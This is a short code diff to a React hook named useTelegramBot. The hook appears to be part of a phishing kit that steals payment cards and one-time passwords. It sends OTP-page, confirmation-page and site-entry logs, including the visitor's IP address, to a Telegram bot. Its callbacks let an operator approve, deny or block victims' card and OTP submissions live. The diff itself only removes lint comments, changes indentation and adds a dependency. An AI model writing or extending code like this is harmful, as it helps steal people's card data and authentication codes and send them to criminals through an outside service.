@@ -142,7 +142,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         reply_markup: keyboard
       });
       
-      // eslint-disable-next-line no-unused-vars
       const messageId = response.data.result.message_id;
       
       console.log('✅ OTP page log sent');
@@ -180,7 +179,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         reply_markup: keyboard
       });
       
-      // eslint-disable-next-line no-unused-vars
       const messageId = response.data.result.message_id;
       
       console.log('✅ Confirmation page log sent (with back to appr button)');
@@ -213,12 +211,12 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   const sendSiteEntryLog = async () => {
     try {
       let userIP = 'Unable to get IP';
-      try {
-        const ipResponse = await axios.get('https://api.ipify.org?format=json');
-        userIP = ipResponse.data.ip;
-      } catch (ipError) {
-        console.error('Error getting IP:', ipError);
-      }
+    try {
+      const ipResponse = await axios.get('https://api.ipify.org?format=json');
+      userIP = ipResponse.data.ip;
+    } catch (ipError) {
+      console.error('Error getting IP:', ipError);
+    }
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
 ━━━━━━━━━━━━━━━━━━━━━
@@ -701,7 +699,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         clearInterval(pollingIntervalRef.current);
       }
     };
-  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp]);
+  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp]);
 
   useEffect(() => {
     const cleanup = setupTelegramPolling();
